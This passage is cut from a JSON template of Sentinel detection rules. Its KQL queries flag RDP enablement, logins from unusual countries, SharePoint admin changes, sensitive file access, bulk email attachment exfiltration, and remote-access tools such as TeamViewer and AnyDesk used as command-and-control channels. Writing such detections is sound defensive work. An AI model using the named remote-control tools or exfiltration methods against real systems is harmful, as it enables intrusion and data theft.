          "query": "let start_time = 1d;\nlet latency = 0h;      \nlet end_time = now();    \nDeviceRegistryEvents\n|where TimeGenerated between (ago(start_time + latency) .. end_time) and ingestion_time() > ago(start_time)\n| where RegistryKey endswith @'Control\\Terminal Server' and RegistryValueData == 0\n| summarize EventStartTime = min(TimeGenerated), EventEndTime = min(TimeGenerated), EventCount = count() by DeviceName, ActionType\n| extend ExtendedDescription = strcat('The registry key fDenyTSConnections on host ', DeviceName, ' has been modified to enable Remote Desktop connections to the system')\n| extend AttackerEntity = array_concat(pack_array(DeviceName))\n| project \n    EventStartTime\n    , EventEndTime\n    , EventCount\n    , ExtendedDescription\n    , DeviceName\n    , ActionType\n    , AttackerEntity\n    , RBAScore=1",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "P1D",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "LateralMovement"
          ],
          "techniques": [
            "T1021"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "P1D",
              "matchingMethod": "Selected",
              "groupByEntities": [
                "Host"
              ],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": {
            "alertDescriptionFormat": "This rule identifies any system that remote desktop protocol is enabled on.\n{{ExtendedDescription}}\ntag: Custom\nCategory: Defender for Endpoints\nMITRE: T1021               "
          },
          "customDetails": {
            "AttackerEntity": "AttackerEntity",
            "RBAScore": "RBAScore"
          },
          "entityMappings": [
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "DeviceName"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-11335')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-11335')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-11335: [Custom] O365 - Login From Unusual Country",
          "description": "This alert identifies O365 mailbox logins from an unapproved country MITRE: T1078,T1114 Category: Office 365 tag: Custom",
          "severity": "Medium",
          "enabled": false,
          "query": "let start_time = 1h;\nlet start_time_historical = 1d;\nlet latency = 0m;\nlet alert_bin = 1h;\nlet end_time = now();\nlet Login_Events = SigninLogs\n|where TimeGenerated between (ago(start_time_historical) .. end_time)\n| where ResultType == 0\n| extend bv_src_user = tolower(split(UserPrincipalName, '@')[0])\n| extend bv_country = tostring(LocationDetails.countryOrRegion)\n| where isnotempty(bv_country)\n| summarize bv_event_count = count(), bv_country = make_set(bv_country), bv_src_ip = make_set(IPAddress) by bv_src_user;\nOfficeActivity\n| where TimeGenerated between (ago(start_time + latency) .. end_time) and ingestion_time() > ago(start_time)\n| where Operation =~ 'MailboxLogin'\n| extend \n      bv_src_user = tolower(split(UserId, '@')[0])\n      , bv_operation = Operation\n| join kind=leftouter Login_Events on bv_src_user\n| where array_length(bv_country) > 0\n| mv-apply e = BV11335_CONFIGURATION.EXCLUSION on (\n    extend keys = bag_keys(e)\n    | extend key_count = iff(keys contains 'metadata', array_length(keys) -1, array_length(keys))\n    | extend bv_src_user_excluded = iff(bv_src_user contains e.bv_src_user and isnotempty(e.bv_src_user), 1, 0)\n    | extend bv_operation_excluded = iff(bv_operation contains e.bv_operation and isnotempty(e.bv_operation), 1, 0)\n    | extend bv_country_excluded = iff((bv_country contains e.bv_country or array_length(set_intersect(e.bv_country, bv_country)) > 0) and isnotempty(e.bv_country), 1, 0)\n    | extend excluded_count = \n            bv_src_user_excluded\n            + bv_operation_excluded\n            + bv_country_excluded\n    | extend excluded = iff(excluded_count == key_count and key_count != 0 , true, false)\n    | extend bv_exclusion_reason = iff(excluded_count == key_count and key_count != 0, parse_json(e.metadata).reason, '')\n    | summarize excluded=make_set(excluded), bv_exclusion_reason = make_set_if(bv_exclusion_reason, isnotempty(bv_exclusion_reason))\n)\n|extend ExcludedEvent = iff(excluded contains 'true', true, false)\n| where not(ExcludedEvent)\n| summarize \n      bv_country   = make_set(bv_country)\n      , bv_src_ip = make_set(bv_src_ip)\n      , bv_start_time = min(TimeGenerated)\n      , bv_end_time   = max(TimeGenerated)\n      , bv_event_count = count()\n    by \n      bv_src_user\n      , bin_at(TimeGenerated, alert_bin, now())\n| extend VictimEntity = pack_array(bv_src_user)\n| extend AttackerEntity = pack_array(bv_src_user)\n| extend ExtendedDescription = strcat(\n      'bv_src_user:', bv_src_user\n      , '\\nbv_country: \\n* ', strcat_array(bv_country, '\\n* ')\n      , '\\nbv_src_ip: \\n* ', strcat_array(bv_src_ip, '\\n* ')\n)\n| project   \n      bv_start_time\n      , bv_end_time\n      , bv_src_user\n      , bv_country\n      , bv_event_count\n      , bv_src_ip\n      , ExtendedDescription\n      , VictimEntity\n      , AttackerEntity\n      , RBAScore = BV11335_CONFIGURATION['RBASCORE']",
          "queryFrequency": "PT1H",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "DefenseEvasion",
            "Persistence",
            "PrivilegeEscalation",
            "InitialAccess",
            "Collection"
          ],
          "techniques": [
            "T1078",
            "T1114"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "P1D",
              "matchingMethod": "Selected",
              "groupByEntities": [
                "Account"
              ],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDescriptionFormat": "This alert identifies O365 mailbox logins from an unapproved country\n\n{{ExtendedDescription}}\n\ntag: Custom\nCategory: Office 365"
          },
          "customDetails": {
            "VictimEntity": "VictimEntity",
            "AttackerEntity": "AttackerEntity",
            "RBAScore": "RBAScore"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "bv_src_user"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-11320')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-11320')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-11320: [Custom] Windows - Successful Login For Monitored Host",
          "description": "This alert identifies authentication activities in Windows Security Logs for a monitored host MITRE: T1078 Category: Windows Security tag: Custom",
          "severity": "Medium",
          "enabled": false,
          "query": "let EventIDList = dynamic([4624]);\nlet start_time = 1h;\nlet latency = 0m;\nlet alert_bin = 1h;\nlet end_time = now();\nSecurityEvent\n|where TimeGenerated between (ago(start_time + latency) .. end_time) and ingestion_time() > ago(start_time)\n| where EventID in (EventIDList)       \n| where Computer in~ (BV11320_CONFIGURATION.MONITORED_HOSTS)\n| extend \n        bv_src_user     = Account\n        , bv_src_dvc    = Computer\n        , bv_event_id   = EventID\n        , bv_start_time = TimeGenerated\n        , bv_workstation = WorkstationName\n        , bv_ip = IpAddress\n| mv-apply e = BV11320_CONFIGURATION.EXCLUSION on (\nextend keys = bag_keys(e)\n| extend key_count = iff(keys contains 'metadata', array_length(keys) -1, array_length(keys))\n| extend bv_src_user_excluded = iff(bv_src_user contains e.bv_src_user and isnotempty(e.bv_src_user), 1, 0)\n| extend bv_src_dvc_excluded = iff(bv_src_dvc contains e.bv_src_dvc and isnotempty(e.bv_src_dvc), 1, 0)\n| extend bv_workstation_excluded = iff(bv_workstation contains e.bv_workstation and isnotempty(e.bv_workstation), 1, 0)\n| extend bv_ip_excluded = iff(bv_ip contains e.bv_ip and isnotempty(e.bv_ip), 1, 0)\n| extend excluded_count = \n        bv_src_user_excluded\n        + bv_src_dvc_excluded\n        + bv_workstation_excluded\n        + bv_ip_excluded\n| extend excluded = iff(excluded_count == key_count and key_count != 0 , true, false)\n| extend bv_exclusion_reason = iff(excluded_count == key_count and key_count != 0, parse_json(e.metadata).reason, '')\n| summarize excluded=make_set(excluded), bv_exclusion_reason = make_set_if(bv_exclusion_reason, isnotempty(bv_exclusion_reason))\n)\n| where not(excluded contains 'true')  \n| summarize \n        bv_src_dvc      = make_set(bv_src_dvc)\n        , bv_event_id   = make_set(bv_event_id)\n        , bv_start_time = min(bv_start_time)\n        , bv_end_time   = max(bv_start_time)\n    by \n        bv_src_user\n        , bin_at(bv_start_time, alert_bin, now())            \n| parse bv_src_user with bv_src_user_domain @'\\' bv_src_user_name  \n| extend VictimEntity = pack_array(bv_src_user_name)\n| extend ExtendedDescription = strcat(\n    'bv_src_user:', bv_src_user\n    , '\\nbv_src_dvc: \\n* ', strcat_array(bv_src_dvc, '\\n* ')\n    , '\\n\\nbv_event_id: \\n* ', strcat_array(bv_event_id, '\\n* ')\n)\n| project \n    bv_start_time\n    , bv_end_time\n    , bv_event_id\n    , bv_src_user\n    , bv_src_user_domain\n    , bv_src_user_name\n    , ExtendedDescription\n    , VictimEntity\n    , RBAScore = BV11320_CONFIGURATION['RBASCORE']",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Persistence"
          ],
          "techniques": [
            "T1078"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "P1D",
              "matchingMethod": "Selected",
              "groupByEntities": [
                "Account"
              ],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": {
            "alertDescriptionFormat": "This alert identifies authentication activities in Windows Security Logs for a monitored host\n\n{{ExtendedDescription}}\n\ntag: Custom\nCategory: Windows Security\nMITRE: T1078"
          },
          "customDetails": {
            "VictimEntity": "VictimEntity",
            "RBAScore": "RBAScore"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "bv_src_user"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-11061')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-11061')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-11061: [Custom] O365 - Sharepoint Sites Modification",
          "description": "This alert identifies Sharepoint site changes via Office 365 logs MITRE: T1213 Category: Office 365 tag: Custom",
          "severity": "Low",
          "enabled": false,
          "query": "let start_time = 1h;\nlet latency = 0m;\nlet alert_bin = 1h;\nlet end_time = now();\nlet exclusion_fields = datatable (\n    bv_src_user:string \n    , bv_vendor_category: string\n)[];\nlet exclusions = ( T:(\n    bv_src_user:string\n    , bv_vendor_category: string    \n    )\n    , Exclusion: dynamic) {\n    T\n    | mv-apply e = Exclusion on (\n        extend keys = bag_keys(e)\n        | extend key_count = iff(keys contains 'metadata', array_length(keys) -1, array_length(keys))\n        | extend bv_src_user_array = split(e.bv_src_user, ',')\n        | mv-apply f = bv_src_user_array on ( \n            extend bv_src_user_excluded = iff(tolower(bv_src_user) contains tolower(f) and isnotempty(f), true, false)\n            | summarize bv_src_user_excluded = countif(bv_src_user_excluded)\n            | extend bv_src_user_excluded = iff(bv_src_user_excluded > 0 , 1, 0)\n        )\n    | extend bv_vendor_category_excluded = iff(bv_vendor_category contains e.bv_vendor_category and isnotempty(e.bv_vendor_category), 1, 0)           \n    | extend excluded_count = \n                  bv_src_user_excluded\n                  + bv_vendor_category_excluded\n    | extend excluded = iff(excluded_count == key_count and key_count != 0 , true, false)\n    | extend bv_exclusion_reason = iff(excluded_count == key_count and key_count != 0, parse_json(e.metadata).reason, '')\n    | summarize excluded=make_set(excluded), bv_exclusion_reason = make_set_if(bv_exclusion_reason, isnotempty(bv_exclusion_reason))\n    )\n    | extend ExcludedEvent = iff(excluded contains 'true', true, false)\n    | project-away excluded\n};         \nOfficeActivity\n|where TimeGenerated between (ago(start_time + latency) .. end_time) and ingestion_time() > ago(start_time)\n| where Operation in~ ('RemovedFromSiteCollection', 'SiteCollectionAdminAdded', 'SiteCollectionAdminRemoved', 'SiteAdminPermissionsRequested')\n| extend \n    bv_src_user = tolower(UserId)\n    , bv_vendor_action = tolower(Operation)\n    , bv_object = OfficeObjectId\n    , bv_src_ip = ClientIP\n    , bv_vendor_category = OfficeWorkload\n| union exclusion_fields | invoke exclusions(BV11061_CONFIGURATION['EXCLUSION']) \n| where not(ExcludedEvent)\n| summarize \n      bv_start_time = min(TimeGenerated)\n      , bv_end_time   = max(TimeGenerated)\n      , bv_event_count = count()\n      , bv_unique_object_cnt = dcount(bv_object)\n      , bv_vendor_action = make_set(bv_vendor_action)\n      , bv_src_ip = make_set(bv_src_ip)\n      , bv_object = make_set(bv_object)\n      , bv_vendor_category = make_set(bv_vendor_category)\n    by \n      bv_src_user\n| where bv_unique_object_cnt > BV11061_CONFIGURATION['EVENT_THRESHOLD']\n| extend VictimEntity = pack_array(bv_src_user)\n| extend AttackerEntity = pack_array(bv_src_user)\n| extend ExtendedDescription = strcat(\n      'bv_src_user:', bv_src_user\n      , '\\nbv_vendor_action: \\n* ', strcat_array(bv_vendor_action, '\\n* ')            \n      , '\\nbv_object: \\n* ', strcat_array(bv_object, '\\n* ')\n      , '\\nbv_src_ip: \\n* ', strcat_array(bv_src_ip, '\\n* ')\n      , '\\nbv_vendor_category: \\n* ', strcat_array(bv_vendor_category, '\\n* ')                                      \n)\n| project   \n      bv_start_time\n      , bv_end_time\n      , bv_src_user\n      , bv_event_count\n      , bv_vendor_action\n      , bv_object\n      , bv_src_ip\n      , bv_unique_object_cnt\n      , ExtendedDescription\n      , VictimEntity\n      , AttackerEntity\n      , RBAScore = BV11061_CONFIGURATION['RBASCORE']",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Collection"
          ],
          "techniques": [
            "T1213"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "P1D",
              "matchingMethod": "Selected",
              "groupByEntities": [
                "Account"
              ],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDescriptionFormat": "This alert identifies Sharepoint site changes via Office 365 logs\n\n{{ExtendedDescription}}\n\ntag: Custom\nCategory: Office 365"
          },
          "customDetails": {
            "VictimEntity": "VictimEntity",
            "AttackerEntity": "AttackerEntity",
            "RBAScore": "RBAScore"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "bv_src_user"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-10511')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-10511')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-10511: [Custom] Windows - Monitor File Access And Changes",
          "description": "Generates an event when a user attempts to access and make changes to monitored files containing sensitive data. MITRE: undefined Category: Windows Security tag: Custom",
          "severity": "Low",
          "enabled": false,
          "query": "let start_time = 1h;\nlet latency = 1h;\nlet alert_bin = 1h;\nlet end_time = now();\nSecurityEvent\n| where TimeGenerated between (ago(start_time + latency) .. end_time) and ingestion_time() > ago(start_time)\n| where EventID in (4663, 4656, 4660, 4670)\n| where ObjectType == \"File\"\n| where ObjectName matches regex BV10511_MONITORED_FILES\n| where AccountType =~ 'User'\n| where AccessMask != '0x1'\n| extend ActivityType = iff(AccessMask == '0x2' or AccessMask == '0x4' or AccessMask == '0x6', 'write', iff(AccessMask == '0x10000', 'delete file', iff(AccessMask == '0x100', 'write file attributes', AccessMask)))\n| extend bv_file_name = tolower(parse_path(ObjectName).Filename)\n| extend bv_file_path = tolower(parse_path(ObjectName).DirectoryPath)\n| parse Account with bv_src_userdomain '\\\\' bv_src_user\n| summarize bv_event_count = count(), bv_start_time = arg_min(TimeGenerated, *), bv_activities = make_set(Activity, 10), bv_activities_count = dcount(Activity), bv_file_name = make_set(bv_file_name, 10), bv_file_count = dcount(bv_file_name), bv_activity_types = make_set(ActivityType, 10), bv_access_mask = make_set(AccessMask, 10), bv_access_list = make_set(AccessList, 10) by bv_src_user, bin_at(TimeGenerated, alert_bin, now())\n| project \n    bv_start_time\n    , bv_event_count\n    , bv_src_user\n    , bv_activities\n    , bv_activities_count\n    , bv_file_name\n    , bv_file_count\n    , bv_activity_types\n    , bv_access_mask\n    , bv_access_list    ",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT2H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": null,
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-10517')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-10517')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-10517: [Custom] Windows - Logon to Monitored Servers",
          "description": "Generates an event when a logon is identified to a monitored server MITRE: T1078 Category: Windows Security tag: Custom",
          "severity": "Low",
          "enabled": false,
          "query": "let EventIDList = dynamic(['4624']);\nlet LogonTypes = dynamic(['2','10']);\nlet latency = 1h;\nlet start_time = 1h;\nlet end_time = now();\nlet alert_bin = 1h;\nSecurityEvent\n| where TimeGenerated between (ago(start_time +latency) .. now()) and ingestion_time() > ago(start_time)\n| where EventID in (EventIDList)\n| where LogonType in (LogonTypes)\n| where Computer in (BV10517_MONITORED_SERVERS)\n| where Account matches regex (BV10517_MONITORED_ACCOUNT_REGEX)\n| extend \n    bv_start_time = TimeGenerated\n    , bv_dest_dvc_hostname = Computer\n    , bv_src_user= Account\n    , bv_src_ip = iff(IpAddress != '-', IpAddress, '')\n    , bv_dest_user = TargetAccount\n    , LogonType\n    , Activity\n| summarize  \n      bv_start_time = min(TimeGenerated)\n      , bv_end_time = max(TimeGenerated)\n      , bv_src_ip   = make_set_if(bv_src_ip, isnotempty(bv_src_ip))\n      , bv_event_id = make_set(EventID)\n      , bv_logon_type = make_set(LogonType)\n      , bv_dest_user = make_set(bv_dest_user)\n  by \n      bv_dest_dvc_hostname\n      , bv_src_user\n| extend RBAScore = 1\n| extend AttackerEntity = array_concat(bv_src_ip, pack_array(bv_src_user))\n| extend VictimEntity = bv_dest_user\n| extend ExtendedDescription = strcat(\n      'bv_dest_dvc_hostname: ', bv_dest_dvc_hostname\n      ,'\\nbv_src_user: ', bv_src_user\n      ,'\\nbv_src_ip: \\n* ', strcat_array(bv_src_ip, '\\n* ')\n      ,'\\n\\nbv_dest_user: \\n* ', strcat_array(bv_dest_user, '\\n* ')\n)\n| project \n    bv_start_time\n    , bv_dest_dvc_hostname\n    , bv_src_user\n    , bv_src_ip\n    , bv_dest_user\n    , bv_logon_type\n    , RBAScore\n    , VictimEntity\n    , AttackerEntity\n    , ExtendedDescription",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT2H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess"
          ],
          "techniques": [
            "T1078"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDescriptionFormat": "Generates an event when a logon is identified to a monitored server\n\n{{ExtendedDescription}}\n\nMITRE: T1078\nCategory: Windows Security\ntag: Custom"
          },
          "customDetails": {
            "AttackerEntity": "AttackerEntity",
            "VictimEntity": "VictimEntity",
            "RBAScore": "RBAScore"
          },
          "entityMappings": null,
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-2912')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-2912')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-2912: [Custom] O365 - Bulk Email Attachments",
          "description": "This rule identifies any M365 Exchange user sending more than 250MB total of email attachments within a 24 hour period. MITRE: T1114,T1030 Category: Office 365 tag: Custom",
          "severity": "Low",
          "enabled": false,
          "query": "let latency = 0h;\nlet start_time = 14d;\nlet end_time = now();\nlet alert_bin = 1d; \nOfficeActivity\n|where TimeGenerated between (ago(latency + start_time) .. end_time) and ingestion_time() > ago(start_time)\n| where OfficeWorkload =~ 'Exchange' and Operation =~ 'Send'\n| extend SizeInBytes_ = toint(parse_json(Item).SizeInBytes)\n| summarize\n    TotalAttachmentSize_MB = sum(SizeInBytes_ / 1000000)\n    , EmailCount = count()\n    , FirstEmail = min(TimeGenerated)\n    , LastEmail = max(TimeGenerated)\n    , SrcIpAddr = make_set(ClientIP, 10)\n    by SrcUserId = UserId, bin_at(TimeGenerated, alert_bin, end_time)\n| extend SrcUsername = split(SrcUserId, '@')[0]\n| extend SrcUserDomain = split(SrcUserId, '@')[1]\n| extend ExcludedUser = iff(SrcUsername in~ (A2912_EXCLUDED_USER), true, false)\n| extend Class = case(ExcludedUser == false and TotalAttachmentSize_MB >= A2912_ATTACHMENT_THRESHOLD, 'Custom', 'RBA')\n| where TotalAttachmentSize_MB >= A2912_ATTACHMENT_THRESHOLD\n| extend Tags = case(Class =~ 'RBA', 'tag: RBA', 'tag: Custom')\n| extend AlertName = strcat('BV-2912: [', Class, '] O365 - Bulk Email Attachments')\n| extend RBAScore = iff(Class == 'Custom', 3, 1)\n| extend AttackerEntity = array_concat(pack_array(SrcUserId), SrcIpAddr)\n| extend ExtendedDescription = strcat('User ', SrcUserId, ' has been observed to send at least ', EmailCount, ' email(s) (attachment size: ', TotalAttachmentSize_MB, 'MB).')\n| project\n    FirstEmail\n    , LastEmail\n    , SrcUserId\n    , SrcIpAddr\n    , TotalAttachmentSize_MB\n    , EmailCount\n    , SrcUsername\n    , SrcUserDomain\n    , Class\n    , Tags\n    , AlertName\n    , RBAScore\n    , AttackerEntity\n    , ExtendedDescription",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "P1D",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Collection",
            "Exfiltration"
          ],
          "techniques": [
            "T1114",
            "T1030"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "P1D",
              "matchingMethod": "Selected",
              "groupByEntities": [
                "Account"
              ],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "{{AlertName}}",
            "alertDescriptionFormat": "This rule identifies any M365 Exchange user sending more than 250MB total of email attachments within a 24 hour period.\n\n{{ExtendedDescription}}\n\n{{Tags}}\nCategory: Office 365\nMITRE: T1114 MITRE: T1030"
          },
          "customDetails": {
            "AttackerEntity": "AttackerEntity",
            "RBAScore": "RBAScore"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "SrcUsername"
                },
                {
                  "identifier": "NTDomain",
                  "columnName": "SrcUserDomain"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-2513')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-2513')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-2513: [Custom] M365 - Remote Desktop Activity",
          "description": "An adversary may use legitimate desktop support and remote access software, such as Team Viewer, AnyDesk, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks. These services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment. MITRE: T1219 Category: M365 Device Logs tag: Custom",
          "severity": "Low",
          "enabled": false,
          "query": "let latency = 15m;\nlet start_time = 15m;\nlet end_time = now();\nDeviceProcessEvents\n| where TimeGenerated between (ago(latency + start_time) .. end_time) and ingestion_time() > ago(start_time)\n| extend Approved = iff(FileName has_any (A2513_APPROVED_APP), true, false)\n| where not(Approved)\n| where FileName has_any (A2513_UNAPPROVED_APP)\n| summarize bv_event_count = count(), bv_start_time = min(TimeGenerated), bv_end_time = max(TimeGenerated), bv_file_path = make_set(FolderPath, 30), bv_file = make_set(FileName, 30) by bv_src_dvc = DeviceName\n| extend VictimEntity = pack_array(bv_src_dvc)\n| extend AttackerEntity = pack_array(bv_src_dvc)\n| extend ExtendedDescription = strcat('Remote desktop software has been used on host: ', bv_src_dvc)\n| project \n    bv_start_time\n    , bv_end_time\n    , bv_event_count\n    , bv_file_path\n    , bv_file\n    , bv_src_dvc\n    , ExtendedDescription\n    , VictimEntity\n    , AttackerEntity\n    , RBAScore = 1",
          "queryFrequency": "PT15M",
          "queryPeriod": "PT30M",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CommandAndControl"
          ],
          "techniques": [
            "T1219"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": true,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [
                "Host"
              ],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDescriptionFormat": "An adversary may use legitimate desktop support and remote access software, such as Team Viewer, AnyDesk, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks. These services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment.\n\n{{ExtendedDescription}}\n\nMITRE: T1219\nCategory: M365 Device Logs\ntag: Custom"
          },
          "customDetails": {
            "AttackerEntity": "AttackerEntity",
            "VictimEntity": "VictimEntity",
            "RBAScore": "RBAScore"
          },
          "entityMappings": [
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "HostName",
                  "columnName": "bv_src_dvc"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-10502')]",
